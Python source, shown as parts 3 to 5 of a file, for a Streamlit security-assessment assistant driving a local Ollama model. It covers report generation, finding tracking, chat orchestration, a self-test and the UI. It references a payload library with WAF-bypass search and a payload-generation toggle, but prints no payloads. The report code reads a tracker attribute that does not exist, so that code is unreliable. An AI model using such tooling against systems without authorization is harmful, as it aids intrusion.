            if not response or not str(response).strip():
                return False, "Model returned an empty response."
            return True, str(response)
        except requests.exceptions.ConnectionError:
            self.invalidate()
            return False, "Lost connection to Ollama. Is 'ollama serve' still running?"
        except Exception as exc:
            logger.error("Generation failed: %s", exc)
            self._last_error = f"Generation error: {exc}"
            return False, self._last_error

    # -- health -----------------------------------------------------------
    def health(self) -> Dict[str, Any]:
        models = self.list_local_models()
        current = str(self.config.get("model"))
        return {
            "ollama_installed": _OLLAMA_AVAILABLE,
            "ollama_running": self.is_available(),
            "models": models,
            "active_model": current,
            "active_model_present": current in models if models else False,
            "last_error": self._last_error,
        }


# ---------------------------------------------------------------------------
# Report generator
# ---------------------------------------------------------------------------

class ReportGenerator:

    SEVERITY_ORDER = ["Critical", "High", "Medium", "Low", "Info"]
    SEVERITY_SCORE = {
        "Critical": 9.5, "High": 7.5, "Medium": 5.0,
        "Low": 2.5, "Info": 0.5,
    }

    # -- helpers ----------------------------------------------------------
    @classmethod
    def _risk_rating(cls, summary: Dict[str, int]) -> str:
        if summary.get("Critical", 0):
            return "CRITICAL — Immediate action required"
        if summary.get("High", 0):
            return "HIGH — Remediation required urgently"
        if summary.get("Medium", 0):
            return "MEDIUM — Schedule remediation"
        if summary.get("Low", 0) or summary.get("Info", 0):
            return "LOW — Monitor and address over time"
        return "INFORMATIONAL — No findings recorded"

    @classmethod
    def _severity_chart(cls, summary: Dict[str, int]) -> str:
        if not summary:
            return "No findings."
        top = max(summary.values()) or 1
        lines = []
        for sev in cls.SEVERITY_ORDER:
            count = summary.get(sev, 0)
            if not count:
                continue
            bar = "█" * max(1, int(count / top * 32))
            lines.append(f"{sev:<10} | {bar} {count}")
        return "\n".join(lines) if lines else "No findings."

    @staticmethod
    def _table_row(k: str, v: Any) -> str:
        return f"| {k} | {v if v not in (None, '') else '—'} |"

    @classmethod
    def _finding_markdown(cls, idx: int, v: VulnerabilityEntry,
                          linked_evidence: List[Dict[str, Any]]) -> List[str]:
        title = v.title or v.cve_id
        out = [f"### {idx}. {title}", ""]
        out.append("| Attribute | Value |")
        out.append("| --- | --- |")
        out.append(cls._table_row("Identifier", v.cve_id))
        out.append(cls._table_row("Severity", v.severity))
        if v.cvss_score:
            out.append(cls._table_row("CVSS", f"{v.cvss_score} {v.cvss_vector}".strip()))
        if v.tools_used:
            out.append(cls._table_row("Tools", ", ".join(v.tools_used)))
        out.append("")

        if v.description:
            out += ["**Description**", "", v.description.strip(), ""]

        if v.impact:
            out += ["**Impact**", "", v.impact.strip(), ""]

        if v.steps_to_reproduce:
            out.append("**Steps to Reproduce**")
            out.append("")
            for i, step in enumerate(v.steps_to_reproduce, 1):
                out.append(f"{i}. {step.strip()}")
            out.append("")

        if linked_evidence:
            out.append("**Evidence**")
            out.append("")
            for ev in linked_evidence:
                caption = f" — {ev['caption']}" if ev.get("caption") else ""
                out.append(f"- `{ev['filename']}`{caption}")
            out.append("")

        if v.mitigation:
            out += ["**Remediation**", "", v.mitigation.strip(), ""]

        if v.references:
            out.append("**References**")
            out.append("")
            for ref in v.references:
                out.append(f"- {ref}")
            out.append("")

        out.append("---")
        out.append("")
        return out

    # -- main outputs -----------------------------------------------------
    @classmethod
    def to_markdown(cls,
                    tracker: VulnerabilityTracker,
                    evidence: List[Dict[str, Any]],
                    session_id: str,
                    author: str = "Security Researcher",
                    org: str = "Independent") -> str:

        now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
        summary = tracker.summary()
        target = tracker.target

        lines: List[str] = [
            "# Security Assessment Report",
            "",
            f"**Report ID:** APEX-{session_id[:8].upper()}",
            f"**Date:** {now}",
            f"**Author:** {author}",
            f"**Organization:** {org}",
            f"**Engine:** {APP_NAME} v{APP_VERSION}",
            "",
            "---",
            "",
            "## 1. Executive Summary",
            "",
            f"**Overall Risk:** {cls._risk_rating(summary)}",
            "",
            f"**Total Findings:** {len(tracker.knowledge_base)}",
            "",
            "### Severity Distribution",
            "",
            "```",
            cls._severity_chart(summary),
            "```",
            "",
            "---",
            "",
            "## 2. Engagement Scope",
            "",
            "| Field | Value |",
            "| --- | --- |",
            cls._table_row("Target", target.ip_address),
            cls._table_row("Hostname", target.hostname),
            cls._table_row("Operating System", target.os_info),
            cls._table_row("MAC Address", target.mac_address),
            cls._table_row("Environment", target.environment),
            cls._table_row("Organization", target.organization),
            cls._table_row("Authorization", target.authorization_ref),
            cls._table_row("Scope Notes", target.scope_notes),
            "",
            "---",
            "",
            "## 3. Findings",
            "",
        ]

        if not tracker.knowledge_base:
            lines.append("_No findings were recorded during this engagement._")
            lines.append("")
        else:
            for idx, v in enumerate(tracker.knowledge_base, 1):
                linked = [
                    e for e in evidence
                    if e.get("linked_cve") and e["linked_cve"] == v.cve_id
                ]
                lines.extend(cls._finding_markdown(idx, v, linked))

        lines += [
            "## 4. Methodology",
            "",
            "Testing followed OWASP Testing Guide, PTES, and MITRE ATT&CK. "
            "All activity was performed under documented authorization.",
            "",
            "---",
            "",
            "## 5. Disclaimer",
            "",
            "This report is provided for authorized security assessment only. "
            "Findings must be remediated in line with the organization's risk "
            "management policy. The tooling authors accept no liability for "
            "misuse or misinterpretation.",
            "",
            "---",
            "",
            f"_Generated by {APP_NAME} v{APP_VERSION} on {now}._",
        ]

        return "\n".join(lines)

    @classmethod
    def to_html(cls, markdown_text: str, title: str = "Security Report") -> str:
        """Convert markdown to a styled HTML document."""
        if _MD_AVAILABLE:
            body = _md_lib.markdown(
                markdown_text,
                extensions=["extra", "tables", "fenced_code", "sane_lists"],
            )
        else:
            escaped = (
                markdown_text
                .replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
            )
            body = f"<pre>{escaped}</pre>"

        css = """
        :root {
          --bg: #0d1117; --surface: #161b22; --border: #30363d;
          --text: #c9d1d9; --muted: #8b949e; --accent: #58a6ff;
          --critical: #f85149; --high: #ff8c42; --medium: #d29922;
        }
        * { box-sizing: border-box; }
        body {
          background: var(--bg); color: var(--text);
          font-family: -apple-system, "Segoe UI", Roboto, sans-serif;
          max-width: 940px; margin: 40px auto; padding: 24px;
          line-height: 1.65;
        }
        h1, h2, h3 { color: var(--accent); border-bottom: 1px solid var(--border);
                     padding-bottom: 6px; margin-top: 32px; }
        h1 { font-size: 1.9rem; }
        h2 { font-size: 1.4rem; }
        h3 { font-size: 1.15rem; }
        a { color: var(--accent); }
        code { color: #79c0ff; background: var(--surface); padding: 1px 5px;
               border-radius: 4px; font-size: 0.9em; }
        pre {
          background: var(--surface); border: 1px solid var(--border);
          padding: 14px; border-radius: 6px; overflow-x: auto;
        }
        pre code { background: transparent; padding: 0; }
        table { border-collapse: collapse; width: 100%; margin: 16px 0; }
        th, td { border: 1px solid var(--border); padding: 8px 10px;
                 text-align: left; vertical-align: top; }
        th { background: var(--surface); color: var(--accent); font-weight: 600; }
        hr { border: 0; border-top: 1px solid var(--border); margin: 28px 0; }
        blockquote { border-left: 3px solid var(--accent); padding-left: 12px;
                     color: var(--muted); margin: 16px 0; }
        """
        return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>{title}</title>
<style>{css}</style>
</head>
<body>
{body}
</body>
</html>
"""

    @classmethod
    def to_json(cls,
                tracker: VulnerabilityTracker,
                evidence: List[Dict[str, Any]],
                session_id: str) -> str:
        summary = tracker.summary()
        payload = {
            "report_id": f"APEX-{session_id[:8].upper()}",
            "generated_at": utc_now(),
            "engine": f"{APP_NAME} v{APP_VERSION}",
            "target": asdict(tracker.target),
            "summary": summary,
            "risk_rating": cls._risk_rating(summary),
            "findings": [asdict(v) for v in tracker.knowledge_base],
            "evidence": evidence,
        }
        return json.dumps(payload, indent=4, ensure_ascii=False, default=str)

    @classmethod
    def save_all(cls,
                 md: str,
                 html: str,
                 js: str,
                 reports_dir: Path = REPORTS_DIR) -> List[Path]:
        stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        out: List[Path] = []
        for ext, content in (("md", md), ("html", html), ("json", js)):
            path = reports_dir / f"apex_report_{stamp}.{ext}"
            try:
                path.write_text(content, encoding="utf-8")
                out.append(path)
            except OSError as exc:
                logger.error("Report save failed for %s: %s", path, exc)
        return out


# = END  PART 3 =
# === PART 4 ===

"""
Vulnerability tracker, chat orchestrator, session bootstrap,
and a small CLI smoke test entry point.
"""


# ---------------------------------------------------------------------------
# Vulnerability tracker
# ---------------------------------------------------------------------------

class VulnerabilityTracker:
    """
    Holds findings for the active engagement. Kept in memory during a
    session; the Report Generator consumes it. Persistence is optional
    and handled at the session layer if needed.
    """

    def __init__(self, system_id: str = "TARGET-ASSET-01") -> None:
        self.system_id = system_id
        self.findings: List[VulnerabilityEntry] = []
        self.target: TargetProfile = TargetProfile()

    # -- target ----------------------------------------------------------
    def set_target(self, profile: TargetProfile) -> None:
        self.target = profile
        logger.info("Target updated: %s (%s)",
                    profile.ip_address or "n/a", profile.environment)

    def has_authorization(self) -> bool:
        return bool(self.target.authorization_ref.strip())

    # -- findings --------------------------------------------------------
    def add(self, entry: VulnerabilityEntry) -> bool:
        if not entry.cve_id.strip():
            return False
        existing = next(
            (f for f in self.findings if f.cve_id == entry.cve_id), None
        )
        if existing:
            logger.info("Finding %s already tracked; skipping", entry.cve_id)
            return False
        self.findings.append(entry)
        logger.info("Finding tracked: %s (%s)", entry.cve_id, entry.severity)
        return True

    def remove(self, cve_id: str) -> bool:
        before = len(self.findings)
        self.findings = [f for f in self.findings if f.cve_id != cve_id]
        return len(self.findings) < before

    def get(self, cve_id: str) -> Optional[VulnerabilityEntry]:
        return next((f for f in self.findings if f.cve_id == cve_id), None)

    def clear(self) -> None:
        self.findings.clear()

    # -- summary ---------------------------------------------------------
    def summary(self) -> Dict[str, int]:
        counts: Dict[str, int] = {}
        for f in self.findings:
            counts[f.severity] = counts.get(f.severity, 0) + 1
        return counts

    def critical_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == "Critical")

    def export_json(self) -> str:
        payload = {
            "system_id": self.system_id,
            "target": asdict(self.target),
            "findings": [asdict(f) for f in self.findings],
            "summary": self.summary(),
            "exported_at": utc_now(),
        }
        return json.dumps(payload, indent=4, ensure_ascii=False, default=str)


# ---------------------------------------------------------------------------
# Chat orchestrator
# ---------------------------------------------------------------------------

class ChatOrchestrator:
    """
    Runs one conversational turn: build prompt, invoke model, persist
    both sides of the exchange, and attach any evidence context.
    """

    def __init__(self,
                 memory: MemoryManager,
                 config: ConfigManager,
                 bridge: LLMBridge) -> None:
        self.memory = memory
        self.config = config
        self.bridge = bridge

    # -- helpers ---------------------------------------------------------
    def _evidence_context(self, session_id: str) -> str:
        """Summarize recent evidence as text so the model can reason about it."""
        items = self.memory.list_evidence(session_id)
        if not items:
            return ""

        blocks: List[str] = []
        for ev in items[-6:]:
            header = f"[Evidence] {ev['filename']} ({human_size(ev['size_bytes'])})"
            if ev.get("linked_cve"):
                header += f" — linked to {ev['linked_cve']}"
            if ev.get("caption"):
                header += f"\nCaption: {ev['caption']}"
            if ev.get("extracted_text"):
                snippet = ev["extracted_text"].strip()
                if len(snippet) > 800:
                    snippet = snippet[:800] + "...[truncated]"
                header += f"\nExtracted text:\n{snippet}"
            blocks.append(header)
        return "\n\n".join(blocks)

    def _build_user_prompt(self, session_id: str, user_input: str) -> str:
        context = self.memory.build_context(
            session_id,
            last_n=int(self.config.get("context_messages", 30)),
            char_budget=int(self.config.get("context_char_budget", MAX_PROMPT_CHARS)),
        )
        evidence = self._evidence_context(session_id)

        parts: List[str] = []
        if context:
            parts.append("[Conversation so far]\n" + context)
        if evidence:
            parts.append("[Attached evidence]\n" + evidence)
        parts.append("[Current request]\n" + user_input.strip())

        return truncate_text(
            "\n\n".join(parts),
            int(self.config.get("context_char_budget", MAX_PROMPT_CHARS)),
        )

    # -- main turn -------------------------------------------------------
    def process(self,
                session_id: str,
                user_input: str,
                tracker: VulnerabilityTracker,
                include_payload_hints: bool = False) -> Tuple[bool, str]:

        user_input = (user_input or "").strip()
        if not user_input:
            return False, "Empty input."

        # Persist user turn before invoking the model so history survives crashes.
        self.memory.add_message(session_id, "user", user_input)

        system_prompt = PromptEngineer.build(
            persona_key=str(self.config.get("persona")),
            target=tracker.target,
            allow_payload=bool(self.config.get("allow_payload_gen")),
            custom_prompt=str(self.config.get("custom_prompt", "")),
            cisa_items=load_threat_intel(),
            include_payload_hints=include_payload_hints,
        )

        user_prompt = self._build_user_prompt(session_id, user_input)

        ok, response = self.bridge.generate(user_prompt, system_prompt)

        if ok:
            self.memory.add_message(session_id, "assistant", response)
        else:
            self.memory.add_message(
                session_id,
                "assistant",
                f"[engine error] {response}",
                meta={"error": True},
            )

        return ok, response

    # -- utilities -------------------------------------------------------
    def stream_process(self,
                       session_id: str,
                       user_input: str,
                       tracker: VulnerabilityTracker):
        """
        Optional streaming hook. Falls back to a single yield if the
        underlying model does not support streaming. Interface is
        generator-compatible so the UI can consume uniformly.
        """
        ok, response = self.process(session_id, user_input, tracker)
        if not ok:
            yield f"[error] {response}"
            return
        # Chunk by paragraph to simulate streaming in the UI without
        # requiring model-side token streaming.
        buffer = ""
        for line in response.splitlines(keepends=True):
            buffer += line
            if len(buffer) > 200:
                yield buffer
                buffer = ""
        if buffer:
            yield buffer


# ---------------------------------------------------------------------------
# Session state bootstrap
# ---------------------------------------------------------------------------

def bootstrap_session_state() -> None:
    """
    Prepare Streamlit session state. Safe to call multiple times.
    Requires Streamlit runtime; guarded so import does not fail in a
    non-Streamlit context (e.g., unit tests, CLI smoke test).
    """
    if not _STREAMLIT_AVAILABLE or st is None:
        return

    if "config_mgr" not in st.session_state:
        st.session_state.config_mgr = ConfigManager()

    if "memory" not in st.session_state:
        st.session_state.memory = MemoryManager()

    if "v_tracker" not in st.session_state:
        st.session_state.v_tracker = VulnerabilityTracker()

    if "llm_bridge" not in st.session_state:
        st.session_state.llm_bridge = LLMBridge(st.session_state.config_mgr)

    if "orchestrator" not in st.session_state:
        st.session_state.orchestrator = ChatOrchestrator(
            st.session_state.memory,
            st.session_state.config_mgr,
            st.session_state.llm_bridge,
        )

    if "session_id" not in st.session_state:
        st.session_state.session_id = st.session_state.memory.create_session(
            title="Engagement Session"
        )

    if "scope_ack" not in st.session_state:
        st.session_state.scope_ack = False

    if "payload_ack" not in st.session_state:
        st.session_state.payload_ack = False


# ---------------------------------------------------------------------------
# CLI smoke test
# ---------------------------------------------------------------------------

def _cli_self_test() -> int:
    """
    Offline sanity check. Verifies config, memory, payload library,
    prompt engineering, and report generation all function without
    needing Streamlit or Ollama.
    """
    print(f"{APP_NAME} v{APP_VERSION} — self test")

    cfg = ConfigManager()
    print(f"  config: model={cfg.get('model')} persona={cfg.get('persona')}")

    mem = MemoryManager()
    sid = mem.create_session(title="self-test")
    mem.add_message(sid, "user", "hello")
    mem.add_message(sid, "assistant", "hi")
    mem.add_message(sid, "assistant", "engine down", meta={"error": True})
    msgs = mem.get_messages(sid, include_errors=False)
    assert len(msgs) == 2, f"expected 2 clean messages, got {len(msgs)}"
    print(f"  memory: session={sid[:8]} clean_messages={len(msgs)}")

    payload_count = PayloadLibrary.count()
    assert payload_count > 0, "payload library empty"
    cats = PayloadLibrary.categories()
    print(f"  payloads: {payload_count} across {len(cats)} categories")

    sample = PayloadLibrary.search("waf-bypass")
    print(f"  payload search 'waf-bypass': {len(sample)} hits")

    target = TargetProfile(ip_address="10.0.0.5", os_info="Linux",
                           authorization_ref="SOW-2024-042")
    system_prompt = PromptEngineer.build(
        persona_key="apex-sec",
        target=target,
        allow_payload=True,
        cisa_items=[],
    )
    assert "APEX-SEC" in system_prompt
    assert "SOW-2024-042" in system_prompt
    print(f"  prompt: {len(system_prompt)} chars")

    tracker = VulnerabilityTracker()
    tracker.set_target(target)
    tracker.add(VulnerabilityEntry(
        cve_id="LAB-001",
        severity="High",
        title="Reflected XSS in search",
        description="Reflected XSS via q parameter.",
        mitigation="Encode output, apply CSP.",
    ))
    md = ReportGenerator.to_markdown(tracker, [], sid)
    html = ReportGenerator.to_html(md)
    js = ReportGenerator.to_json(tracker, [], sid)
    assert "LAB-001" in md
    assert "<html" in html and "<body" in html
    assert "LAB-001" in js
    print(f"  report: markdown={len(md)} html={len(html)} json={len(js)}")

    print("  result: OK")
    return 0


if __name__ == "__main__":
    raise SystemExit(_cli_self_test())


# = END OF PART 4 =
# === PART 5 ===

"""
Streamlit application shell: page config, theme, header,
sidebar, and the chat tab.
"""


# ---------------------------------------------------------------------------
# Page configuration and theme
# ---------------------------------------------------------------------------

def configure_page() -> None:
    """Streamlit page setup. No-op outside a Streamlit runtime."""
    if not _STREAMLIT_AVAILABLE or st is None:
        return
    st.set_page_config(
        page_title=f"{APP_NAME} | {APP_TAGLINE}",
        page_icon="🛡️",
        layout="wide",
        initial_sidebar_state="expanded",
    )


THEME_CSS = """
<style>
:root {
  --bg: #0b0f14;
  --surface: #131a22;
  --surface-2: #1a232e;
  --border: #263040;
  --text: #d5dde6;
  --muted: #7d8b9c;
  --accent: #4d9eff;
  --accent-dim: #2d6fd1;
  --green: #2ea043;
  --red: #e5484d;
  --amber: #d29922;
}
.stApp { background: var(--bg); color: var(--text); }
section[data-testid="stSidebar"] {
  background: var(--surface);
  border-right: 1px solid var(--border);
}
section[data-testid="stSidebar"] * { color: var(--text); }
h1, h2, h3, h4 { color: var(--accent) !important; letter-spacing: 0.2px; }
a { color: var(--accent); text-decoration: none; }
a:hover { text-decoration: underline; }

.stButton > button {
  background: var(--red);
  color: #fff;
  border: 1px solid #f2555a;
  border-radius: 6px;
  font-weight: 600;
  padding: 6px 14px;
  width: 100%;
  transition: filter 0.12s ease, transform 0.08s ease;
}
.stButton > button:hover { filter: brightness(1.1); transform: translateY(-1px); }
.stButton > button:active { transform: translateY(0); }

.stDownloadButton > button {
  background: var(--green);
  color: #fff;
  border: 1px solid #3fb950;
  border-radius: 6px;
  font-weight: 600;
  padding: 6px 14px;
  width: 100%;
}
.stDownloadButton > button:hover { filter: brightness(1.08); }

.stTextInput input,
.stTextArea textarea,
.stNumberInput input,
.stSelectbox div[data-baseweb="select"] > div {
  background: var(--surface-2) !important;
  color: var(--text) !important;
  border: 1px solid var(--border) !important;
  border-radius: 6px !important;
}

.stTabs [data-baseweb="tab-list"] {
  background: var(--surface);
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 6px;
  gap: 4px;
}
.stTabs [data-baseweb="tab"] {
  background: transparent;
  color: var(--muted);
  border-radius: 6px;
  padding: 8px 14px;
  font-weight: 600;
}
.stTabs [aria-selected="true"] {
  background: var(--surface-2) !important;
  color: var(--accent) !important;
}

code, pre {
  background: var(--surface-2) !important;
  color: #79c0ff !important;
  border-radius: 6px;
}

div[data-testid="stExpander"] {
  background: var(--surface);
  border: 1px solid var(--border);
  border-radius: 8px;
}

div[data-testid="stMetricValue"] { color: var(--accent); }

.apex-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 18px 24px;
  background: linear-gradient(135deg, #131a22 0%, #0b0f14 100%);
  border: 1px solid var(--border);
  border-radius: 10px;
  margin-bottom: 18px;
}
.apex-header h1 {
  margin: 0;
  font-size: 1.65rem;
  color: var(--accent) !important;
}
.apex-header p {
  margin: 4px 0 0 0;
  color: var(--muted);
  font-size: 0.9rem;
}
.apex-badge {
  padding: 4px 10px;
  border-radius: 12px;
  background: var(--surface-2);
  color: var(--muted);
  font-size: 0.75rem;
  border: 1px solid var(--border);
}

.sev-critical { color: #ff6b6b; font-weight: 700; }
.sev-high     { color: #ff9642; font-weight: 700; }
.sev-medium   { color: #ffd166; font-weight: 700; }
.sev-low      { color: #8ecae6; font-weight: 700; }
.sev-info     { color: #9aa5b1; font-weight: 700; }

.evidence-card {
  background: var(--surface);
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 10px 12px;
  margin-bottom: 8px;
}
.evidence-card .title { font-weight: 600; color: var(--accent); }
.evidence-card .meta  { color: var(--muted); font-size: 0.8rem; }

.scope-warning {
  background: rgba(229,72,77,0.08);
  border: 1px solid rgba(229,72,77,0.4);
  border-radius: 8px;
  padding: 12px 16px;
  color: #ffb4b6;
  font-size: 0.9rem;
}
</style>
"""


def inject_theme() -> None:
    if not _STREAMLIT_AVAILABLE or st is None:
        return
    st.markdown(THEME_CSS, unsafe_allow_html=True)


def render_header() -> None:
    if not _STREAMLIT_AVAILABLE or st is None:
        return
    st.markdown(
        f"""
        <div class="apex-header">
            <div>
                <h1>🛡️ {APP_NAME} <span class="apex-badge">v{APP_VERSION}</span></h1>
                <p>{APP_TAGLINE} · Local Ollama · On-premises only</p>
            </div>
            <div class="apex-badge">{datetime.now().strftime('%Y-%m-%d %H:%M')}</div>
        </div>
        """,
        unsafe_allow_html=True,
    )


# ---------------------------------------------------------------------------
# Sidebar
# ---------------------------------------------------------------------------

def render_sidebar() -> None:
    if not _STREAMLIT_AVAILABLE or st is None:
        return

    config: ConfigManager = st.session_state.config_mgr
    memory: MemoryManager = st.session_state.memory
    tracker: VulnerabilityTracker = st.session_state.v_tracker
    bridge: LLMBridge = st.session_state.llm_bridge
    sid: str = st.session_state.session_id

    with st.sidebar:
        st.markdown("### ⚙️ Command Center")

        # ---------------- Target profile ---------------------------------
        with st.expander("🎯 Target Profile", expanded=True):
            ip = st.text_input("Target IP / Host", value=tracker.target.ip_address,
                               key="sb_ip")
            hostname = st.text_input("Hostname", value=tracker.target.hostname,
                                     key="sb_host")
            os_info = st.text_input("Operating System", value=tracker.target.os_info,
                                    key="sb_os")
            mac = st.text_input("MAC Address", value=tracker.target.mac_address,
                                key="sb_mac")

            env_options = ["lab", "staging", "production", "ctf", "bug-bounty"]
            env_index = (env_options.index(tracker.target.environment)
                         if tracker.target.environment in env_options else 0)
            env = st.selectbox("Environment", env_options, index=env_index,
                               key="sb_env")

            org = st.text_input("Organization", value=tracker.target.organization,
                                key="sb_org")
            auth_ref = st.text_input(
                "Authorization Reference",
                value=tracker.target.authorization_ref,
                placeholder="SOW / ticket / engagement ID",
                key="sb_auth_ref",
            )
            scope = st.text_area(
                "Scope Notes",
                value=tracker.target.scope_notes,
                height=70,
                key="sb_scope",
            )

            if st.button("💾 Save Target", key="btn_save_target"):
                tracker.set_target(TargetProfile(
                    ip_address=ip.strip(),
                    hostname=hostname.strip(),
                    os_info=os_info.strip(),
                    mac_address=mac.strip(),
                    environment=env,
                    organization=org.strip(),
                    authorization_ref=auth_ref.strip(),
                    scope_notes=scope.strip(),
                ))
                bridge.invalidate()
                st.toast("Target saved.", icon="✅")

        # ---------------- Model config -----------------------------------
        with st.expander("🧠 Model Config", expanded=False):
            models = bridge.list_local_models()
            current_model = str(config.get("model"))
            if models and current_model not in models:
                st.caption(f"Note: `{current_model}` not found locally.")

            model = st.text_input(
                "Model",
                value=current_model,
                help="e.g. llama3, llama3.1, mistral, qwen2.5, dolphin-mixtral",
                key="sb_model",
            )
            temperature = st.slider(
                "Temperature", 0.0, 1.0,
                float(config.get("temperature")), 0.05, key="sb_temp",
            )
            top_p = st.slider(
                "Top-p", 0.1, 1.0,
                float(config.get("top_p")), 0.05, key="sb_topp",
            )
            num_predict = st.slider(
                "Max tokens", 256, 8192,
                int(config.get("num_predict")), 128, key="sb_tokens",
            )
            ctx_msgs = st.slider(
                "Memory depth (messages)", 4, 120,
                int(config.get("context_messages")), 2, key="sb_ctx",
            )
            ctx_chars = st.slider(
                "Context char budget", 4000, MAX_PROMPT_CHARS,
                int(config.get("context_char_budget")), 1000, key="sb_ctx_chars",
            )
            allow_payload = st.checkbox(
                "Enable payload generation",
                value=bool(config.get("allow_payload_gen")),
                key="sb_payload",
            )

            if st.button("💾 Save Model Config", key="btn_save_model"):
                changed = config.update({
                    "model": model.strip(),
                    "temperature": float(temperature),
                    "top_p": float(top_p),
                    "num_predict": int(num_predict),
                    "context_messages": int(ctx_msgs),
                    "context_char_budget": int(ctx_chars),
                    "allow_payload_gen": bool(allow_payload),
                })
                if changed:
                    bridge.invalidate()
                st.toast("Model config saved.", icon="✅")

        # ---------------- Persona ----------------------------------------
        with st.expander("🎭 Persona", expanded=False):
            persona_keys = list(PERSONAS.keys())
            current_persona = str(config.get("persona"))
            idx = (persona_keys.index(current_persona)
                   if current_persona in persona_keys else 0)
            chosen = st.selectbox(
                "Active Role",
                persona_keys,
                index=idx,
                format_func=persona_label,
                key="sb_persona",
            )
            if chosen != current_persona:
                config.set("persona", chosen)
                bridge.invalidate()

            if chosen == "custom":
                custom = st.text_area(
                    "Custom persona prompt",
                    value=str(config.get("custom_prompt", "")),
                    height=110,
                    key="sb_custom",
                )
                if st.button("💾 Save Custom Prompt", key="btn_save_custom"):
                    config.set("custom_prompt", custom)
                    bridge.invalidate()
                    st.toast("Custom prompt saved.", icon="✅")

        # ---------------- Threat intel -----------------------------------
        with st.expander("🔄 Threat Intelligence", expanded=False):
            items = load_threat_intel()
            st.caption(f"Cached entries: {len(items)}")
            c1, c2 = st.columns(2)
            with c1:
                if st.button("Sync CISA", key="btn_sync_cisa"):
                    with st.spinner("Syncing…"):
                        ok, msg = sync_cisa_feed()
                    (st.success if ok else st.error)(msg)
                    if ok:
                        st.rerun()
            with c2:
                if st.button("Refresh", key="btn_intel_refresh"):
                    _clear_intel_cache()
                    st.toast("Cache cleared.", icon="🔄")

        # ---------------- Sessions ---------------------------------------
        with st.expander("💬 Sessions", expanded=False):
            sessions = memory.list_sessions()
            if sessions:
                labels = {
                    s["session_id"]: f"{s['title'][:28]} · {s['updated_at'][:16]}"
                    for s in sessions
                }
                current = st.selectbox(
                    "Switch session",
                    list(labels.keys()),
                    format_func=lambda k: labels.get(k, k[:8]),
                    index=(list(labels.keys()).index(sid)
                           if sid in labels else 0),
                    key="sb_session_switch",
                )
                if current != sid:
                    st.session_state.session_id = current
                    bridge.invalidate()
                    st.rerun()

            new_title = st.text_input("New session title",
                                      value="New Engagement",
                                      key="sb_new_title")
            if st.button("➕ New Session", key="btn_new_session"):
                new_sid = memory.create_session(title=new_title or "New Engagement")
                st.session_state.session_id = new_sid
                bridge.invalidate()
                st.rerun()

            if st.button("🗑️ Delete Current", key="btn_del_session"):
                memory.delete_session(sid)
                st.session_state.session_id = memory.create_session(
                    title="New Engagement"
                )
                bridge.invalidate()
                st.rerun()

        # ---------------- Health -----------------------------------------
        with st.expander("📊 Status", expanded=True):
            health = bridge.health()
            running = health["ollama_running"]
            indicator = "🟢" if running else "🔴"
            st.markdown(f"{indicator} **Ollama:** {'online' if running else 'offline'}")

            active_ok = health["active_model_present"]
            st.markdown(
                f"{'🟢' if active_ok else '🟡'} **Model:** `{health['active_model']}`"
            )

            st.caption(f"Persona: {persona_label(str(config.get('persona')))}")
            st.caption(f"Messages in session: {memory.count_messages(sid)}")
            st.caption(f"Findings: {len(tracker.findings)}")

            if health["last_error"]:
                st.caption(f"Last error: {health['last_error'][:120]}")

        st.caption("🔒 100% local · No telemetry · No cloud calls")


# ---------------------------------------------------------------------------
# Chat tab
# ---------------------------------------------------------------------------

def _sev_class(sev: str) -> str:
    return {
        "critical": "sev-critical",
        "high": "sev-high",
        "medium": "sev-medium",
        "low": "sev-low",
        "info": "sev-info",
    }.get((sev or "").lower(), "sev-info")


def render_chat_tab() -> None:
    if not _STREAMLIT_AVAILABLE or st is None:
        return

    memory: MemoryManager = st.session_state.memory
    tracker: VulnerabilityTracker = st.session_state.v_tracker
    orchestrator: ChatOrchestrator = st.session_state.orchestrator
    config: ConfigManager = st.session_state.config_mgr
    sid: str = st.session_state.session_id

    # ---------------- Authorization banner -------------------------------
    if not tracker.has_authorization():
        st.markdown(
            '<div class="scope-warning">⚠️ No authorization reference set. '
            'Enter a SOW / ticket ID in the Target Profile before running '
            'active tests.</div>',
            unsafe_allow_html=True,
        )

    # ---------------- Evidence upload ------------------------------------
    with st.expander("📎 Attach Evidence (screenshots, logs, captures)",
                     expanded=False):
        uploads = st.file_uploader(
            "Upload files",
            type=["png", "jpg", "jpeg", "gif", "webp", "pdf",
                  "txt", "log", "json", "xml", "csv"],
            accept_multiple_files=True,
            key="chat_uploads",
        )
        c1, c2 = st.columns(2)
        with c1:
            caption = st.text_input("Caption", key="chat_caption")
        with c2:
            linked_cve = st.text_input("Link to finding ID",
                                       key="chat_linked_cve")

        if uploads and st.button("💾 Save Evidence", key="btn_save_evidence"):
            saved = 0
            for f in uploads:
                item = EvidenceManager.save_upload(f, sid, caption, linked_cve)
                if not item:
                    continue
                memory.add_evidence(
                    session_id=sid,
                    filename=item.filename,
                    filepath=item.filepath,
                    mime_type=item.mime_type,
                    size_bytes=item.size_bytes,
                    caption=item.caption,
                    linked_cve=item.linked_cve,
                    extracted_text=item.extracted_text,
                )
                saved += 1
            if saved:
                st.toast(f"Saved {saved} file(s).", icon="✅")
                st.rerun()
            else:
                st.error("No files were saved (unsupported type or empty).")

    # ---------------- Evidence gallery -----------------------------------
    evidence_items = memory.list_evidence(sid)
    if evidence_items:
        with st.expander(f"🗂️ Evidence Gallery ({len(evidence_items)})",
                         expanded=False):
            for ev in evidence_items:
                col1, col2 = st.columns([1, 3])
                with col1:
                    if EvidenceManager.is_image(ev["mime_type"]):
                        try:
                            st.image(ev["filepath"], use_container_width=True)
                        except Exception:
                            st.text("[image unavailable]")
                    else:
                        st.markdown(
                            f"<div class='evidence-card'>"
                            f"<div class='title'>{Path(ev['filename']).suffix.upper()}</div>"
                            f"</div>",
                            unsafe_allow_html=True,
                        )
                with col2:
                    st.markdown(f"**{ev['filename']}**")
                    meta = f"{human_size(ev['size_bytes'])} · {ev['created_at'][:19]}"
                    if ev.get("linked_cve"):
                        meta += f" · linked: {ev['linked_cve']}"
                    st.caption(meta)
                    if ev.get("caption"):
                        st.caption(f"Caption: {ev['caption']}")
